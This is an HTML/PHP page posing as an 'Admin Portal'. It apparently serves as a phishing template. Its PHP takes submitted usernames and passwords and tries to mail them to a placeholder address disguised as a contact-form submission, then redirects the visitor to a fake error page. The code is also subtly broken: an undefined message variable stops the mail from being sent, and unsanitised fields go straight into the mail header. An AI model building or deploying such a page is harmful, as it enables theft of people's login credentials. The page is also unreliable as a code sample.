<html>
<head>
<title> Admin Portal - YOUR WEBSITE </title>
		<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
	<link rel="stylesheet" href="assets/css/main.css" />


<?php
  if($_POST){
    $to = 'example@email.com';
    $subject = 'Contact Form Submission';
    $from_name = $_POST['user'];
    $from_email = $_POST['pass'];
    $robotest = $_POST['robotest'];
    if($robotest)
      $error = "";
    else{
      if($from_name && $from_email && $message){
        $header = "From: $from_name <$from_email>";
        if(mail($to, $subject, $message, $header))
          $success = "";
        else
          $error = "";
      }else
        $error = "";
    }
    if($error)
      echo '<div class="msg error">'.$error.'</div>';
    elseif($success)
      echo '<div class="msg success">'.$success.'</div>';
  }




?>


<script>
window.location = "http://yourwebsite.com/admin/error?id=1&lang=EN";
</script>